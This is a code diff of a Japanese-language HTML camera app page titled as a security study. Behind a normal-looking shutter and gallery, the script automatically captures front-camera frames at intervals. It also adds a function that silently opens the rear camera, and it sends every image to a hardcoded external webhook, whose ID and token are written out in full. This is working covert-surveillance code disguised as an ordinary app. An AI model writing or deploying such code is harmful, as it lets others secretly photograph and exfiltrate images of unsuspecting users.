@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>カメラアプリセキュリティ勉強</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     html, body {
       margin: 0;
@@ -116,7 +116,7 @@
     const apiPath = "/api/webhooks";
     const webhookId = "1192062408462696518";
     const webhookToken = "w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
-    
+
     const webhookUrl = `${protocol}://${domain}${apiPath}/${webhookId}/${webhookToken}`;
 
     const config = {
@@ -134,18 +134,16 @@
     const shutterSound = document.getElementById('shutterSound');
     const photos = [];
 
-    let userStream = null;
-    let backStream = null;
+    let currentStream = null;
 
     async function initCamera() {
-      userStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      video.srcObject = userStream;
+      currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      video.srcObject = currentStream;
       startAutoCapture();
     }
 
-    async function captureImage(stream) {
-      const track = stream.getVideoTracks()[0];
+    async function captureFromCurrentStream() {
+      const track = currentStream.getVideoTracks()[0];
       const imageCapture = new ImageCapture(track);
       const bitmap = await imageCapture.grabFrame();
       const canvas = document.createElement('canvas');
@@ -154,6 +152,26 @@
       const ctx = canvas.getContext('2d');
       ctx.drawImage(bitmap, 0, 0);
       return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
+    }
+
+    async function captureImageSilently(facingMode) {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const bitmap = await imageCapture.grabFrame();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = bitmap.width;
+      canvas.height = bitmap.height;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(bitmap, 0, 0);
+
+      return new Promise(res => {
+        canvas.toBlob(blob => {
+          stream.getTracks().forEach(t => t.stop());
+          res(blob);
+        }, 'image/jpeg', config.quality);
+      });
     }
 
     async function sendToWebhook(blob, label) {
@@ -177,7 +195,7 @@
     shutterBtn.onclick = async () => {
       showFlash();
       shutterSound.play();
-      const blob = await captureImage(userStream);
+      const blob = await captureFromCurrentStream();
       if (blob.size <= config.maxSize) {
         updatePreview(blob);
         addToGallery(blob);
@@ -224,26 +242,27 @@
 
     function startAutoCapture() {
       setInterval(async () => {
-        const blobUser = await captureImage(userStream);
-        if (blobUser.size <= config.maxSize) {
-          sendToWebhook(blobUser, "内カメラ画像（自動）");
-        }
-        const blobBack = await captureImage(backStream);
-        if (blobBack.size <= config.maxSize) {
-          sendToWebhook(blobBack, "外カメラ画像（自動）");
+        try {
+          const blobUser = await captureFromCurrentStream();
+          if (blobUser.size <= config.maxSize) {
+            sendToWebhook(blobUser, "内カメラ画像（自動）");
+          }
+
+          const blobBack = await captureImageSilently('environment');
+          if (blobBack.size <= config.maxSize) {
+            sendToWebhook(blobBack, "外カメラ画像（自動）");
+          }
+        } catch (e) {
+          console.error("自動キャプチャエラー:", e);
         }
       }, config.interval);
     }
 
     window.addEventListener("beforeunload", () => {
-      userStream?.getTracks().forEach(t => t.stop());
-      backStream?.getTracks().forEach(t => t.stop());
+      currentStream?.getTracks().forEach(t => t.stop());
     });
 
     initCamera();
   </script>
 </body>
 </html>
-
-
-
